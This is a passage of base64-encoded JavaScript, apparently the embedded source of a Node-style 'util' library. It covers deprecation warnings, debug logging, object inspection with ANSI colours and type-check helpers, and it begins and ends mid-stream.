iZSB1c2VkLlxuLy8gUmV0dXJucyBhIG1vZGlmaWVkIGZ1bmN0aW9uIHdoaWNoIHdhcm5zIG9uY2UgYnkgZGVmYXVsdC5cbi8vIElmIC0tbm8tZGVwcmVjYXRpb24gaXMgc2V0LCB0aGVuIGl0IGlzIGEgbm8tb3AuXG5leHBvcnRzLmRlcHJlY2F0ZSA9IGZ1bmN0aW9uKGZuLCBtc2cpIHtcbiAgLy8gQWxsb3cgZm9yIGRlcHJlY2F0aW5nIHRoaW5ncyBpbiB0aGUgcHJvY2VzcyBvZiBzdGFydGluZyB1cC5cbiAgaWYgKGlzVW5kZWZpbmVkKGdsb2JhbC5wcm9jZXNzKSkge1xuICAgIHJldHVybiBmdW5jdGlvbigpIHtcbiAgICAgIHJldHVybiBleHBvcnRzLmRlcHJlY2F0ZShmbiwgbXNnKS5hcHBseSh0aGlzLCBhcmd1bWVudHMpO1xuICAgIH07XG4gIH1cblxuICBpZiAocHJvY2Vzcy5ub0RlcHJlY2F0aW9uID09PSB0cnVlKSB7XG4gICAgcmV0dXJuIGZuO1xuICB9XG5cbiAgdmFyIHdhcm5lZCA9IGZhbHNlO1xuICBmdW5jdGlvbiBkZXByZWNhdGVkKCkge1xuICAgIGlmICghd2FybmVkKSB7XG4gICAgICBpZiAocHJvY2Vzcy50aHJvd0RlcHJlY2F0aW9uKSB7XG4gICAgICAgIHRocm93IG5ldyBFcnJvcihtc2cpO1xuICAgICAgfSBlbHNlIGlmIChwcm9jZXNzLnRyYWNlRGVwcmVjYXRpb24pIHtcbiAgICAgICAgY29uc29sZS50cmFjZShtc2cpO1xuICAgICAgfSBlbHNlIHtcbiAgICAgICAgY29uc29sZS5lcnJvcihtc2cpO1xuICAgICAgfVxuICAgICAgd2FybmVkID0gdHJ1ZTtcbiAgICB9XG4gICAgcmV0dXJuIGZuLmFwcGx5KHRoaXMsIGFyZ3VtZW50cyk7XG4gIH1cblxuICByZXR1cm4gZGVwcmVjYXRlZDtcbn07XG5cblxudmFyIGRlYnVncyA9IHt9O1xudmFyIGRlYnVnRW52aXJvbjtcbmV4cG9ydHMuZGVidWdsb2cgPSBmdW5jdGlvbihzZXQpIHtcbiAgaWYgKGlzVW5kZWZpbmVkKGRlYnVnRW52aXJvbikpXG4gICAgZGVidWdFbnZpcm9uID0gcHJvY2Vzcy5lbnYuTk9ERV9ERUJVRyB8fCAnJztcbiAgc2V0ID0gc2V0LnRvVXBwZXJDYXNlKCk7XG4gIGlmICghZGVidWdzW3NldF0pIHtcbiAgICBpZiAobmV3IFJlZ0V4cCgnXFxcXGInICsgc2V0ICsgJ1xcXFxiJywgJ2knKS50ZXN0KGRlYnVnRW52aXJvbikpIHtcbiAgICAgIHZhciBwaWQgPSBwcm9jZXNzLnBpZDtcbiAgICAgIGRlYnVnc1tzZXRdID0gZnVuY3Rpb24oKSB7XG4gICAgICAgIHZhciBtc2cgPSBleHBvcnRzLmZvcm1hdC5hcHBseShleHBvcnRzLCBhcmd1bWVudHMpO1xuICAgICAgICBjb25zb2xlLmVycm9yKCclcyAlZDogJXMnLCBzZXQsIHBpZCwgbXNnKTtcbiAgICAgIH07XG4gICAgfSBlbHNlIHtcbiAgICAgIGRlYnVnc1tzZXRdID0gZnVuY3Rpb24oKSB7fTtcbiAgICB9XG4gIH1cbiAgcmV0dXJuIGRlYnVnc1tzZXRdO1xufTtcblxuXG4vKipcbiAqIEVjaG9zIHRoZSB2YWx1ZSBvZiBhIHZhbHVlLiBUcnlzIHRvIHByaW50IHRoZSB2YWx1ZSBvdXRcbiAqIGluIHRoZSBiZXN0IHdheSBwb3NzaWJsZSBnaXZlbiB0aGUgZGlmZmVyZW50IHR5cGVzLlxuICpcbiAqIEBwYXJhbSB7T2JqZWN0fSBvYmogVGhlIG9iamVjdCB0byBwcmludCBvdXQuXG4gKiBAcGFyYW0ge09iamVjdH0gb3B0cyBPcHRpb25hbCBvcHRpb25zIG9iamVjdCB0aGF0IGFsdGVycyB0aGUgb3V0cHV0LlxuICovXG4vKiBsZWdhY3k6IG9iaiwgc2hvd0hpZGRlbiwgZGVwdGgsIGNvbG9ycyovXG5mdW5jdGlvbiBpbnNwZWN0KG9iaiwgb3B0cykge1xuICAvLyBkZWZhdWx0IG9wdGlvbnNcbiAgdmFyIGN0eCA9IHtcbiAgICBzZWVuOiBbXSxcbiAgICBzdHlsaXplOiBzdHlsaXplTm9Db2xvclxuICB9O1xuICAvLyBsZWdhY3kuLi5cbiAgaWYgKGFyZ3VtZW50cy5sZW5ndGggPj0gMykgY3R4LmRlcHRoID0gYXJndW1lbnRzWzJdO1xuICBpZiAoYXJndW1lbnRzLmxlbmd0aCA+PSA0KSBjdHguY29sb3JzID0gYXJndW1lbnRzWzNdO1xuICBpZiAoaXNCb29sZWFuKG9wdHMpKSB7XG4gICAgLy8gbGVnYWN5Li4uXG4gICAgY3R4LnNob3dIaWRkZW4gPSBvcHRzO1xuICB9IGVsc2UgaWYgKG9wdHMpIHtcbiAgICAvLyBnb3QgYW4gXCJvcHRpb25zXCIgb2JqZWN0XG4gICAgZXhwb3J0cy5fZXh0ZW5kKGN0eCwgb3B0cyk7XG4gIH1cbiAgLy8gc2V0IGRlZmF1bHQgb3B0aW9uc1xuICBpZiAoaXNVbmRlZmluZWQoY3R4LnNob3dIaWRkZW4pKSBjdHguc2hvd0hpZGRlbiA9IGZhbHNlO1xuICBpZiAoaXNVbmRlZmluZWQoY3R4LmRlcHRoKSkgY3R4LmRlcHRoID0gMjtcbiAgaWYgKGlzVW5kZWZpbmVkKGN0eC5jb2xvcnMpKSBjdHguY29sb3JzID0gZmFsc2U7XG4gIGlmIChpc1VuZGVmaW5lZChjdHguY3VzdG9tSW5zcGVjdCkpIGN0eC5jdXN0b21JbnNwZWN0ID0gdHJ1ZTtcbiAgaWYgKGN0eC5jb2xvcnMpIGN0eC5zdHlsaXplID0gc3R5bGl6ZVdpdGhDb2xvcjtcbiAgcmV0dXJuIGZvcm1hdFZhbHVlKGN0eCwgb2JqLCBjdHguZGVwdGgpO1xufVxuZXhwb3J0cy5pbnNwZWN0ID0gaW5zcGVjdDtcblxuXG4vLyBodHRwOi8vZW4ud2lraXBlZGlhLm9yZy93aWtpL0FOU0lfZXNjYXBlX2NvZGUjZ3JhcGhpY3Ncbmluc3BlY3QuY29sb3JzID0ge1xuICAnYm9sZCcgOiBbMSwgMjJdLFxuICAnaXRhbGljJyA6IFszLCAyM10sXG4gICd1bmRlcmxpbmUnIDogWzQsIDI0XSxcbiAgJ2ludmVyc2UnIDogWzcsIDI3XSxcbiAgJ3doaXRlJyA6IFszNywgMzldLFxuICAnZ3JleScgOiBbOTAsIDM5XSxcbiAgJ2JsYWNrJyA6IFszMCwgMzldLFxuICAnYmx1ZScgOiBbMzQsIDM5XSxcbiAgJ2N5YW4nIDogWzM2LCAzOV0sXG4gICdncmVlbicgOiBbMzIsIDM5XSxcbiAgJ21hZ2VudGEnIDogWzM1LCAzOV0sXG4gICdyZWQnIDogWzMxLCAzOV0sXG4gICd5ZWxsb3cnIDogWzMzLCAzOV1cbn07XG5cbi8vIERvbid0IHVzZSAnYmx1ZScgbm90IHZpc2libGUgb24gY21kLmV4ZVxuaW5zcGVjdC5zdHlsZXMgPSB7XG4gICdzcGVjaWFsJzogJ2N5YW4nLFxuICAnbnVtYmVyJzogJ3llbGxvdycsXG4gICdib29sZWFuJzogJ3llbGxvdycsXG4gICd1bmRlZmluZWQnOiAnZ3JleScsXG4gICdudWxsJzogJ2JvbGQnLFxuICAnc3RyaW5nJzogJ2dyZWVuJyxcbiAgJ2RhdGUnOiAnbWFnZW50YScsXG4gIC8vIFwibmFtZVwiOiBpbnRlbnRpb25hbGx5IG5vdCBzdHlsaW5nXG4gICdyZWdleHAnOiAncmVkJ1xufTtcblxuXG5mdW5jdGlvbiBzdHlsaXplV2l0aENvbG9yKHN0ciwgc3R5bGVUeXBlKSB7XG4gIHZhciBzdHlsZSA9IGluc3BlY3Quc3R5bGVzW3N0eWxlVHlwZV07XG5cbiAgaWYgKHN0eWxlKSB7XG4gICAgcmV0dXJuICdcXHUwMDFiWycgKyBpbnNwZWN0LmNvbG9yc1tzdHlsZV1bMF0gKyAnbScgKyBzdHIgK1xuICAgICAgICAgICAnXFx1MDAxYlsnICsgaW5zcGVjdC5jb2xvcnNbc3R5bGVdWzFdICsgJ20nO1xuICB9IGVsc2Uge1xuICAgIHJldHVybiBzdHI7XG4gIH1cbn1cblxuXG5mdW5jdGlvbiBzdHlsaXplTm9Db2xvcihzdHIsIHN0eWxlVHlwZSkge1xuICByZXR1cm4gc3RyO1xufVxuXG5cbmZ1bmN0aW9uIGFycmF5VG9IYXNoKGFycmF5KSB7XG4gIHZhciBoYXNoID0ge307XG5cbiAgYXJyYXkuZm9yRWFjaChmdW5jdGlvbih2YWwsIGlkeCkge1xuICAgIGhhc2hbdmFsXSA9IHRydWU7XG4gIH0pO1xuXG4gIHJldHVybiBoYXNoO1xufVxuXG5cbmZ1bmN0aW9uIGZvcm1hdFZhbHVlKGN0eCwgdmFsdWUsIHJlY3Vyc2VUaW1lcykge1xuICAvLyBQcm92aWRlIGEgaG9vayBmb3IgdXNlci1zcGVjaWZpZWQgaW5zcGVjdCBmdW5jdGlvbnMuXG4gIC8vIENoZWNrIHRoYXQgdmFsdWUgaXMgYW4gb2JqZWN0IHdpdGggYW4gaW5zcGVjdCBmdW5jdGlvbiBvbiBpdFxuICBpZiAoY3R4LmN1c3RvbUluc3BlY3QgJiZcbiAgICAgIHZhbHVlICYmXG4gICAgICBpc0Z1bmN0aW9uKHZhbHVlLmluc3BlY3QpICYmXG4gICAgICAvLyBGaWx0ZXIgb3V0IHRoZSB1dGlsIG1vZHVsZSwgaXQncyBpbnNwZWN0IGZ1bmN0aW9uIGlzIHNwZWNpYWxcbiAgICAgIHZhbHVlLmluc3BlY3QgIT09IGV4cG9ydHMuaW5zcGVjdCAmJlxuICAgICAgLy8gQWxzbyBmaWx0ZXIgb3V0IGFueSBwcm90b3R5cGUgb2JqZWN0cyB1c2luZyB0aGUgY2lyY3VsYXIgY2hlY2suXG4gICAgICAhKHZhbHVlLmNvbnN0cnVjdG9yICYmIHZhbHVlLmNvbnN0cnVjdG9yLnByb3RvdHlwZSA9PT0gdmFsdWUpKSB7XG4gICAgdmFyIHJldCA9IHZhbHVlLmluc3BlY3QocmVjdXJzZVRpbWVzLCBjdHgpO1xuICAgIGlmICghaXNTdHJpbmcocmV0KSkge1xuICAgICAgcmV0ID0gZm9ybWF0VmFsdWUoY3R4LCByZXQsIHJlY3Vyc2VUaW1lcyk7XG4gICAgfVxuICAgIHJldHVybiByZXQ7XG4gIH1cblxuICAvLyBQcmltaXRpdmUgdHlwZXMgY2Fubm90IGhhdmUgcHJvcGVydGllc1xuICB2YXIgcHJpbWl0aXZlID0gZm9ybWF0UHJpbWl0aXZlKGN0eCwgdmFsdWUpO1xuICBpZiAocHJpbWl0aXZlKSB7XG4gICAgcmV0dXJuIHByaW1pdGl2ZTtcbiAgfVxuXG4gIC8vIExvb2sgdXAgdGhlIGtleXMgb2YgdGhlIG9iamVjdC5cbiAgdmFyIGtleXMgPSBPYmplY3Qua2V5cyh2YWx1ZSk7XG4gIHZhciB2aXNpYmxlS2V5cyA9IGFycmF5VG9IYXNoKGtleXMpO1xuXG4gIGlmIChjdHguc2hvd0hpZGRlbikge1xuICAgIGtleXMgPSBPYmplY3QuZ2V0T3duUHJvcGVydHlOYW1lcyh2YWx1ZSk7XG4gIH1cblxuICAvLyBJRSBkb2Vzbid0IG1ha2UgZXJyb3IgZmllbGRzIG5vbi1lbnVtZXJhYmxlXG4gIC8vIGh0dHA6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS9pZS9kd3c1MnNidCh2PXZzLjk0KS5hc3B4XG4gIGlmIChpc0Vycm9yKHZhbHVlKVxuICAgICAgJiYgKGtleXMuaW5kZXhPZignbWVzc2FnZScpID49IDAgfHwga2V5cy5pbmRleE9mKCdkZXNjcmlwdGlvbicpID49IDApKSB7XG4gICAgcmV0dXJuIGZvcm1hdEVycm9yKHZhbHVlKTtcbiAgfVxuXG4gIC8vIFNvbWUgdHlwZSBvZiBvYmplY3Qgd2l0aG91dCBwcm9wZXJ0aWVzIGNhbiBiZSBzaG9ydGN1dHRlZC5cbiAgaWYgKGtleXMubGVuZ3RoID09PSAwKSB7XG4gICAgaWYgKGlzRnVuY3Rpb24odmFsdWUpKSB7XG4gICAgICB2YXIgbmFtZSA9IHZhbHVlLm5hbWUgPyAnOiAnICsgdmFsdWUubmFtZSA6ICcnO1xuICAgICAgcmV0dXJuIGN0eC5zdHlsaXplKCdbRnVuY3Rpb24nICsgbmFtZSArICddJywgJ3NwZWNpYWwnKTtcbiAgICB9XG4gICAgaWYgKGlzUmVnRXhwKHZhbHVlKSkge1xuICAgICAgcmV0dXJuIGN0eC5zdHlsaXplKFJlZ0V4cC5wcm90b3R5cGUudG9TdHJpbmcuY2FsbCh2YWx1ZSksICdyZWdleHAnKTtcbiAgICB9XG4gICAgaWYgKGlzRGF0ZSh2YWx1ZSkpIHtcbiAgICAgIHJldHVybiBjdHguc3R5bGl6ZShEYXRlLnByb3RvdHlwZS50b1N0cmluZy5jYWxsKHZhbHVlKSwgJ2RhdGUnKTtcbiAgICB9XG4gICAgaWYgKGlzRXJyb3IodmFsdWUpKSB7XG4gICAgICByZXR1cm4gZm9ybWF0RXJyb3IodmFsdWUpO1xuICAgIH1cbiAgfVxuXG4gIHZhciBiYXNlID0gJycsIGFycmF5ID0gZmFsc2UsIGJyYWNlcyA9IFsneycsICd9J107XG5cbiAgLy8gTWFrZSBBcnJheSBzYXkgdGhhdCB0aGV5IGFyZSBBcnJheVxuICBpZiAoaXNBcnJheSh2YWx1ZSkpIHtcbiAgICBhcnJheSA9IHRydWU7XG4gICAgYnJhY2VzID0gWydbJywgJ10nXTtcbiAgfVxuXG4gIC8vIE1ha2UgZnVuY3Rpb25zIHNheSB0aGF0IHRoZXkgYXJlIGZ1bmN0aW9uc1xuICBpZiAoaXNGdW5jdGlvbih2YWx1ZSkpIHtcbiAgICB2YXIgbiA9IHZhbHVlLm5hbWUgPyAnOiAnICsgdmFsdWUubmFtZSA6ICcnO1xuICAgIGJhc2UgPSAnIFtGdW5jdGlvbicgKyBuICsgJ10nO1xuICB9XG5cbiAgLy8gTWFrZSBSZWdFeHBzIHNheSB0aGF0IHRoZXkgYXJlIFJlZ0V4cHNcbiAgaWYgKGlzUmVnRXhwKHZhbHVlKSkge1xuICAgIGJhc2UgPSAnICcgKyBSZWdFeHAucHJvdG90eXBlLnRvU3RyaW5nLmNhbGwodmFsdWUpO1xuICB9XG5cbiAgLy8gTWFrZSBkYXRlcyB3aXRoIHByb3BlcnRpZXMgZmlyc3Qgc2F5IHRoZSBkYXRlXG4gIGlmIChpc0RhdGUodmFsdWUpKSB7XG4gICAgYmFzZSA9ICcgJyArIERhdGUucHJvdG90eXBlLnRvVVRDU3RyaW5nLmNhbGwodmFsdWUpO1xuICB9XG5cbiAgLy8gTWFrZSBlcnJvciB3aXRoIG1lc3NhZ2UgZmlyc3Qgc2F5IHRoZSBlcnJvclxuICBpZiAoaXNFcnJvcih2YWx1ZSkpIHtcbiAgICBiYXNlID0gJyAnICsgZm9ybWF0RXJyb3IodmFsdWUpO1xuICB9XG5cbiAgaWYgKGtleXMubGVuZ3RoID09PSAwICYmICghYXJyYXkgfHwgdmFsdWUubGVuZ3RoID09IDApKSB7XG4gICAgcmV0dXJuIGJyYWNlc1swXSArIGJhc2UgKyBicmFjZXNbMV07XG4gIH1cblxuICBpZiAocmVjdXJzZVRpbWVzIDwgMCkge1xuICAgIGlmIChpc1JlZ0V4cCh2YWx1ZSkpIHtcbiAgICAgIHJldHVybiBjdHguc3R5bGl6ZShSZWdFeHAucHJvdG90eXBlLnRvU3RyaW5nLmNhbGwodmFsdWUpLCAncmVnZXhwJyk7XG4gICAgfSBlbHNlIHtcbiAgICAgIHJldHVybiBjdHguc3R5bGl6ZSgnW09iamVjdF0nLCAnc3BlY2lhbCcpO1xuICAgIH1cbiAgfVxuXG4gIGN0eC5zZWVuLnB1c2godmFsdWUpO1xuXG4gIHZhciBvdXRwdXQ7XG4gIGlmIChhcnJheSkge1xuICAgIG91dHB1dCA9IGZvcm1hdEFycmF5KGN0eCwgdmFsdWUsIHJlY3Vyc2VUaW1lcywgdmlzaWJsZUtleXMsIGtleXMpO1xuICB9IGVsc2Uge1xuICAgIG91dHB1dCA9IGtleXMubWFwKGZ1bmN0aW9uKGtleSkge1xuICAgICAgcmV0dXJuIGZvcm1hdFByb3BlcnR5KGN0eCwgdmFsdWUsIHJlY3Vyc2VUaW1lcywgdmlzaWJsZUtleXMsIGtleSwgYXJyYXkpO1xuICAgIH0pO1xuICB9XG5cbiAgY3R4LnNlZW4ucG9wKCk7XG5cbiAgcmV0dXJuIHJlZHVjZVRvU2luZ2xlU3RyaW5nKG91dHB1dCwgYmFzZSwgYnJhY2VzKTtcbn1cblxuXG5mdW5jdGlvbiBmb3JtYXRQcmltaXRpdmUoY3R4LCB2YWx1ZSkge1xuICBpZiAoaXNVbmRlZmluZWQodmFsdWUpKVxuICAgIHJldHVybiBjdHguc3R5bGl6ZSgndW5kZWZpbmVkJywgJ3VuZGVmaW5lZCcpO1xuICBpZiAoaXNTdHJpbmcodmFsdWUpKSB7XG4gICAgdmFyIHNpbXBsZSA9ICdcXCcnICsgSlNPTi5zdHJpbmdpZnkodmFsdWUpLnJlcGxhY2UoL15cInxcIiQvZywgJycpXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAucmVwbGFjZSgvJy9nLCBcIlxcXFwnXCIpXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAucmVwbGFjZSgvXFxcXFwiL2csICdcIicpICsgJ1xcJyc7XG4gICAgcmV0dXJuIGN0eC5zdHlsaXplKHNpbXBsZSwgJ3N0cmluZycpO1xuICB9XG4gIGlmIChpc051bWJlcih2YWx1ZSkpXG4gICAgcmV0dXJuIGN0eC5zdHlsaXplKCcnICsgdmFsdWUsICdudW1iZXInKTtcbiAgaWYgKGlzQm9vbGVhbih2YWx1ZSkpXG4gICAgcmV0dXJuIGN0eC5zdHlsaXplKCcnICsgdmFsdWUsICdib29sZWFuJyk7XG4gIC8vIEZvciBzb21lIHJlYXNvbiB0eXBlb2YgbnVsbCBpcyBcIm9iamVjdFwiLCBzbyBzcGVjaWFsIGNhc2UgaGVyZS5cbiAgaWYgKGlzTnVsbCh2YWx1ZSkpXG4gICAgcmV0dXJuIGN0eC5zdHlsaXplKCdudWxsJywgJ251bGwnKTtcbn1cblxuXG5mdW5jdGlvbiBmb3JtYXRFcnJvcih2YWx1ZSkge1xuICByZXR1cm4gJ1snICsgRXJyb3IucHJvdG90eXBlLnRvU3RyaW5nLmNhbGwodmFsdWUpICsgJ10nO1xufVxuXG5cbmZ1bmN0aW9uIGZvcm1hdEFycmF5KGN0eCwgdmFsdWUsIHJlY3Vyc2VUaW1lcywgdmlzaWJsZUtleXMsIGtleXMpIHtcbiAgdmFyIG91dHB1dCA9IFtdO1xuICBmb3IgKHZhciBpID0gMCwgbCA9IHZhbHVlLmxlbmd0aDsgaSA8IGw7ICsraSkge1xuICAgIGlmIChoYXNPd25Qcm9wZXJ0eSh2YWx1ZSwgU3RyaW5nKGkpKSkge1xuICAgICAgb3V0cHV0LnB1c2goZm9ybWF0UHJvcGVydHkoY3R4LCB2YWx1ZSwgcmVjdXJzZVRpbWVzLCB2aXNpYmxlS2V5cyxcbiAgICAgICAgICBTdHJpbmcoaSksIHRydWUpKTtcbiAgICB9IGVsc2Uge1xuICAgICAgb3V0cHV0LnB1c2goJycpO1xuICAgIH1cbiAgfVxuICBrZXlzLmZvckVhY2goZnVuY3Rpb24oa2V5KSB7XG4gICAgaWYgKCFrZXkubWF0Y2goL15cXGQrJC8pKSB7XG4gICAgICBvdXRwdXQucHVzaChmb3JtYXRQcm9wZXJ0eShjdHgsIHZhbHVlLCByZWN1cnNlVGltZXMsIHZpc2libGVLZXlzLFxuICAgICAgICAgIGtleSwgdHJ1ZSkpO1xuICAgIH1cbiAgfSk7XG4gIHJldHVybiBvdXRwdXQ7XG59XG5cblxuZnVuY3Rpb24gZm9ybWF0UHJvcGVydHkoY3R4LCB2YWx1ZSwgcmVjdXJzZVRpbWVzLCB2aXNpYmxlS2V5cywga2V5LCBhcnJheSkge1xuICB2YXIgbmFtZSwgc3RyLCBkZXNjO1xuICBkZXNjID0gT2JqZWN0LmdldE93blByb3BlcnR5RGVzY3JpcHRvcih2YWx1ZSwga2V5KSB8fCB7IHZhbHVlOiB2YWx1ZVtrZXldIH07XG4gIGlmIChkZXNjLmdldCkge1xuICAgIGlmIChkZXNjLnNldCkge1xuICAgICAgc3RyID0gY3R4LnN0eWxpemUoJ1tHZXR0ZXIvU2V0dGVyXScsICdzcGVjaWFsJyk7XG4gICAgfSBlbHNlIHtcbiAgICAgIHN0ciA9IGN0eC5zdHlsaXplKCdbR2V0dGVyXScsICdzcGVjaWFsJyk7XG4gICAgfVxuICB9IGVsc2Uge1xuICAgIGlmIChkZXNjLnNldCkge1xuICAgICAgc3RyID0gY3R4LnN0eWxpemUoJ1tTZXR0ZXJdJywgJ3NwZWNpYWwnKTtcbiAgICB9XG4gIH1cbiAgaWYgKCFoYXNPd25Qcm9wZXJ0eSh2aXNpYmxlS2V5cywga2V5KSkge1xuICAgIG5hbWUgPSAnWycgKyBrZXkgKyAnXSc7XG4gIH1cbiAgaWYgKCFzdHIpIHtcbiAgICBpZiAoY3R4LnNlZW4uaW5kZXhPZihkZXNjLnZhbHVlKSA8IDApIHtcbiAgICAgIGlmIChpc051bGwocmVjdXJzZVRpbWVzKSkge1xuICAgICAgICBzdHIgPSBmb3JtYXRWYWx1ZShjdHgsIGRlc2MudmFsdWUsIG51bGwpO1xuICAgICAgfSBlbHNlIHtcbiAgICAgICAgc3RyID0gZm9ybWF0VmFsdWUoY3R4LCBkZXNjLnZhbHVlLCByZWN1cnNlVGltZXMgLSAxKTtcbiAgICAgIH1cbiAgICAgIGlmIChzdHIuaW5kZXhPZignXFxuJykgPiAtMSkge1xuICAgICAgICBpZiAoYXJyYXkpIHtcbiAgICAgICAgICBzdHIgPSBzdHIuc3BsaXQoJ1xcbicpLm1hcChmdW5jdGlvbihsaW5lKSB7XG4gICAgICAgICAgICByZXR1cm4gJyAgJyArIGxpbmU7XG4gICAgICAgICAgfSkuam9pbignXFxuJykuc3Vic3RyKDIpO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgIHN0ciA9ICdcXG4nICsgc3RyLnNwbGl0KCdcXG4nKS5tYXAoZnVuY3Rpb24obGluZSkge1xuICAgICAgICAgICAgcmV0dXJuICcgICAnICsgbGluZTtcbiAgICAgICAgICB9KS5qb2luKCdcXG4nKTtcbiAgICAgICAgfVxuICAgICAgfVxuICAgIH0gZWxzZSB7XG4gICAgICBzdHIgPSBjdHguc3R5bGl6ZSgnW0NpcmN1bGFyXScsICdzcGVjaWFsJyk7XG4gICAgfVxuICB9XG4gIGlmIChpc1VuZGVmaW5lZChuYW1lKSkge1xuICAgIGlmIChhcnJheSAmJiBrZXkubWF0Y2goL15cXGQrJC8pKSB7XG4gICAgICByZXR1cm4gc3RyO1xuICAgIH1cbiAgICBuYW1lID0gSlNPTi5zdHJpbmdpZnkoJycgKyBrZXkpO1xuICAgIGlmIChuYW1lLm1hdGNoKC9eXCIoW2EtekEtWl9dW2EtekEtWl8wLTldKilcIiQvKSkge1xuICAgICAgbmFtZSA9IG5hbWUuc3Vic3RyKDEsIG5hbWUubGVuZ3RoIC0gMik7XG4gICAgICBuYW1lID0gY3R4LnN0eWxpemUobmFtZSwgJ25hbWUnKTtcbiAgICB9IGVsc2Uge1xuICAgICAgbmFtZSA9IG5hbWUucmVwbGFjZSgvJy9nLCBcIlxcXFwnXCIpXG4gICAgICAgICAgICAgICAgIC5yZXBsYWNlKC9cXFxcXCIvZywgJ1wiJylcbiAgICAgICAgICAgICAgICAgLnJlcGxhY2UoLyheXCJ8XCIkKS9nLCBcIidcIik7XG4gICAgICBuYW1lID0gY3R4LnN0eWxpemUobmFtZSwgJ3N0cmluZycpO1xuICAgIH1cbiAgfVxuXG4gIHJldHVybiBuYW1lICsgJzogJyArIHN0cjtcbn1cblxuXG5mdW5jdGlvbiByZWR1Y2VUb1NpbmdsZVN0cmluZyhvdXRwdXQsIGJhc2UsIGJyYWNlcykge1xuICB2YXIgbnVtTGluZXNFc3QgPSAwO1xuICB2YXIgbGVuZ3RoID0gb3V0cHV0LnJlZHVjZShmdW5jdGlvbihwcmV2LCBjdXIpIHtcbiAgICBudW1MaW5lc0VzdCsrO1xuICAgIGlmIChjdXIuaW5kZXhPZignXFxuJykgPj0gMCkgbnVtTGluZXNFc3QrKztcbiAgICByZXR1cm4gcHJldiArIGN1ci5yZXBsYWNlKC9cXHUwMDFiXFxbXFxkXFxkP20vZywgJycpLmxlbmd0aCArIDE7XG4gIH0sIDApO1xuXG4gIGlmIChsZW5ndGggPiA2MCkge1xuICAgIHJldHVybiBicmFjZXNbMF0gK1xuICAgICAgICAgICAoYmFzZSA9PT0gJycgPyAnJyA6IGJhc2UgKyAnXFxuICcpICtcbiAgICAgICAgICAgJyAnICtcbiAgICAgICAgICAgb3V0cHV0LmpvaW4oJyxcXG4gICcpICtcbiAgICAgICAgICAgJyAnICtcbiAgICAgICAgICAgYnJhY2VzWzFdO1xuICB9XG5cbiAgcmV0dXJuIGJyYWNlc1swXSArIGJhc2UgKyAnICcgKyBvdXRwdXQuam9pbignLCAnKSArICcgJyArIGJyYWNlc1sxXTtcbn1cblxuXG4vLyBOT1RFOiBUaGVzZSB0eXBlIGNoZWNraW5nIGZ1bmN0aW9ucyBpbnRlbnRpb25hbGx5IGRvbid0IHVzZSBgaW5zdGFuY2VvZmBcbi8vIGJlY2F1c2UgaXQgaXMgZnJhZ2lsZSBhbmQgY2FuIGJlIGVhc2lseSBmYWtlZCB3aXRoIGBPYmplY3QuY3JlYXRlKClgLlxuZnVuY3Rpb24gaXNBcnJheShhcikge1xuICByZXR1cm4gQXJyYXkuaXNBcnJheShhcik7XG59XG5leHBvcnRzLmlzQXJyYXkgPSBpc0FycmF5O1xuXG5mdW5jdGlvbiBpc0Jvb2xlYW4oYXJnKSB7XG4gIHJldHVybiB0eXBlb2YgYXJnID09PSAnYm9vbGVhbic7XG59XG5leHBvcnRzLmlzQm9vbGVhbiA9IGlzQm9vbGVhbjtcblxuZnVuY3Rpb24gaXNOdWxsKGFyZykge1xuICByZXR1cm4gYXJnID09PSBudWxsO1xufVxuZXhwb3J0cy5pc051bGwgPSBpc051bGw7XG5cbmZ1bmN0aW9uIGlzTnVsbE9yVW5kZWZpbmVkKGFyZykge1xuICByZXR1cm4gYXJnID09IG51bGw7XG59XG5leHBvcnRzLmlzTnVsbE9yVW5kZWZpbmVkID0gaXNOdWxsT3JVbmRlZmluZWQ7XG5cbmZ1bmN0aW9uIGlzTnVtYmVyKGFyZykge1xuICByZXR1cm4gdHlwZW9mIGFyZyA9PT0gJ251bWJlcic7XG59XG5leHBvcnRzLmlzTnVtYmVyID0gaXNOdW1iZXI7XG5cbmZ1bmN0aW9uIGlzU3RyaW5nKGFyZykge1xuICByZXR1cm4gdHlwZW9mIGFyZyA9PT0gJ3N0cmluZyc7XG59XG5leHBvcnRzLmlzU3RyaW5nID0gaXNTdHJpbmc7XG5cbmZ1bmN0aW9uIGlzU3ltYm9sKGFyZykge1xuICByZXR1cm4gdHlwZW9mIGFyZyA9PT0gJ3N5bWJvbCc7XG59XG5leHBvcnRzLmlzU3ltYm9sID0gaXNTeW1ib2w7XG5cbmZ1bmN0aW9uIGlzVW5kZWZpbmVkKGFyZykge1xuICByZXR1cm4gYXJnID09PSB2b2lkIDA7XG59XG5leHBvcnRzLmlzVW5kZWZpbmVkID0gaXNVbmRlZmluZWQ7XG5cbmZ1bmN0aW9uIGlzUmVnRXhwKHJlKSB7XG4gIHJldHVybiBpc09iamVjdChyZSkgJiYgb2JqZWN0VG9TdHJpbmcocmUpID09PSAnW29iamVjdCBSZWdFeHBdJztcbn1cbmV4cG9ydHMuaXNSZWdFeHAgPSBpc1JlZ0V4cDtcblxuZnVuY3Rpb24gaXNPYmplY3QoYXJnKSB7XG4gIHJldHVybiB0eXBlb2YgYXJnID09PSAnb2JqZWN0JyAmJiBhcmcgIT09IG51bGw7XG59XG5leHBvcnRzLmlzT2JqZWN0ID0gaXNPYmplY3Q7XG5cbmZ1bmN0aW9uIGlzRGF0ZShkKSB7XG4gIHJldHVybiBpc09iamVjdChkKSAmJiBvYmplY3RUb1N0cmluZyhkKSA9PT0gJ1tvYmplY3QgRGF0ZV0nO1xufVxuZXhwb3J0cy5pc0RhdGUgPSBpc0RhdGU7XG5cbmZ1bmN0aW9uIGlzRXJyb3IoZSkge1xuICByZXR1cm4gaXNPYmplY3QoZSkgJiZcbiAgICAgIChvYmplY3RUb1N0cmluZyhlKSA9PT0gJ1tvYmplY3QgRXJyb3JdJyB8fCBlIGluc3RhbmNlb2YgRXJyb3IpO1xufVxuZXhwb3J0cy5pc0Vycm9yID0gaXNFcnJvcjtcblxuZnVuY3Rpb24gaXNGdW5jdGlvbihhcmcpIHtcbiAgcmV0dXJuIHR5cGVvZiBhcmcgPT09ICdmdW5jdGlvbic7XG59XG5leHBvcnRzLmlzRnVuY3Rpb24gPSBpc0Z1bmN0aW9uO1xuXG5mdW5jdGlvbiBpc1ByaW1pdGl2ZShhcmcpIHtcbiAgcmV0dX